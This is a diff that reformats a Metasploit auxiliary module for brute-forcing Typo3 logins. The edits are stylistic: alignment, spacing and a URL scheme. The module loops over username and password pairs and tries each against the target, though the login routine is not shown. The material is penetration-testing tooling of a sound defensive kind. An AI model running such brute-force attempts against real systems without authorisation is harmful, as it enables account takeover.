@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::Typo3
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -14,10 +11,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Typo3 Login Bruteforcer',
+      'Name' => 'Typo3 Login Bruteforcer',
       'Description' => 'This module attempts to bruteforce Typo3 logins.',
-      'Author'      => [ 'Christian Mehlmauer' ],
-      'License'     => MSF_LICENSE
+      'Author' => [ 'Christian Mehlmauer' ],
+      'License' => MSF_LICENSE
     )
   end
 
@@ -25,8 +22,8 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Trying to bruteforce login")
 
     res = send_request_cgi({
-      'method'  => 'GET',
-      'uri'	 => target_uri.to_s
+      'method' => 'GET',
+      'uri'	=> target_uri.to_s
     })
 
     unless res
@@ -35,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     each_user_pass { |user, pass|
-      try_login(user,pass)
+      try_login(user, pass)
     }
   end
 
